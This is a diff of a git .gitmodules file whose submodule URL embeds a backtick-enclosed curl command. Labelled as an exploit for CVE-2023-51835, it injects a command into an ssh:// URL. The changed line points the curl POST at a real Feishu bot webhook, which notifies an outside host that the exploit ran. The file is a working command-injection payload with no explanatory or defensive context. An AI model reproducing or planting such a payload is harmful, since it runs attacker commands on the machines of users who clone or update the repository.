@@ -1,3 +1,3 @@
 [submodule "cves"]
 	path = cves
-	url = ssh://`curl  -H "Content-Type: application/json" -d '{"msg_type":"text","content":{"text":"cve-2023-51835 exp successfully"}}' -X POST `foo.example.com/bar
+	url = ssh://`curl  -H "Content-Type: application/json" -d '{"msg_type":"text","content":{"text":"cve-2023-51835 exp successfully"}}' -X POST https://open.feishu.cn/open-apis/bot/v2/hook/ad00ba01-087b-44f8-a44c-08c151d50d0d`foo.example.com/bar
